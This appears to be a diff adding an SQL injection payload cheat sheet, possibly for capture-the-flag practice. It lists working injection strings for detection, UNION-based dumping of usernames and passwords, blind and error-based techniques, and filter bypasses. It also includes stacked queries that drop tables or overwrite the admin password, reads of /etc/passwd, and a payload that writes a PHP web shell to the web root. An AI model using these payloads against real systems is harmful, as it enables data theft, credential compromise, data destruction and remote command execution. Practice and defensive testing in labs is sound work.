@@ -1,0 +1,150 @@
+=== DETECTION ===
+'
+"
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin'--
+admin'#
+
+=== DETERMINE NUMBER OF COLUMNS ===
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+=== FIND STRING COLUMNS (3 columns example) ===
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+
+=== DATABASE VERSION ===
+' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT NULL,version,NULL FROM v$instance--
+
+=== DATABASE NAME ===
+' UNION SELECT NULL,database(),NULL--
+' UNION SELECT NULL,DB_NAME(),NULL--
+
+=== LIST DATABASES ===
+' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+
+=== LIST TABLES ===
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='DATABASE_NAME'--
+
+=== LIST COLUMNS ===
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--
+
+=== EXTRACT DATA ===
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
+' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users--
+' UNION SELECT NULL,STRING_AGG(username||':'||password,','),NULL FROM users--
+
+=== ORACLE SPECIFIC (requires FROM dual) ===
+' UNION SELECT NULL,NULL FROM dual--
+' UNION SELECT NULL,banner FROM v$version--
+' UNION SELECT NULL,table_name FROM all_tables--
+' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+=== MYSQL SPECIFIC ===
+' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users#
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()#
+' UNION SELECT NULL,@@datadir,NULL#
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL#
+
+=== POSTGRESQL SPECIFIC ===
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT NULL,current_database(),NULL--
+' UNION SELECT NULL,string_agg(username||':'||password,','),NULL FROM users--
+
+=== MSSQL SPECIFIC ===
+' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT NULL,DB_NAME(),NULL--
+' UNION SELECT NULL,name,NULL FROM sys.databases--
+' UNION SELECT NULL,name,NULL FROM sys.tables--
+
+=== COMMENTS (to close the query) ===
+'--
+'-- -
+'#
+'/*
+';%00
+
+=== CONCATENATION EXAMPLES ===
+CONCAT(str1,str2,str3)
+CONCAT_WS(':',str1,str2)
+str1||str2||str3
+str1+str2+str3
+
+=== COMMON BYPASSES ===
+' OR 1=1--
+' OR 'x'='x
+' OR 1=1#
+') OR '1'='1'--
+' OR '1'='1' /*
+admin' OR '1'='1
+admin' OR 1=1--
+admin'--
+' UNION SELECT NULL,NULL,NULL WHERE 1=1--
+' AND 1=0 UNION SELECT NULL,username,password FROM users--
+
+=== TIME-BASED BLIND ===
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+'; WAITFOR DELAY '00:00:05'--
+' || pg_sleep(5)--
+
+=== BOOLEAN-BASED BLIND ===
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(database(),1,1)='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>97--
+' AND LENGTH(database())>5--
+
+=== ERROR-BASED ===
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
+
+=== FILTER BYPASS ===
+' UNION SELECT NULL,username,password FROM users--
+' UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL,username,password /*!50000FROM*/ users--
+' %55nion %53elect NULL,username,password %46rom users--
+' UnIoN SeLeCt NULL,username,password FrOm users--
+' UNION ALL SELECT NULL,username,password FROM users--
+
+=== STACKED QUERIES ===
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+=== MULTIPLE STATEMENTS ===
+' ; SELECT * FROM users--
+' ; SELECT SLEEP(5)--
+
+=== READING FILES (MySQL) ===
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT NULL,LOAD_FILE('C:\\windows\\system32\\drivers\\etc\\hosts'),NULL--
+
+=== WRITING FILES (MySQL - requires FILE privilege) ===
+' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+=== COMMON CTF PATTERNS ===
+' UNION SELECT NULL,flag,NULL FROM flags--
+' UNION SELECT NULL,secret,NULL FROM secrets--
+' UNION SELECT NULL,password,NULL FROM admin--
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
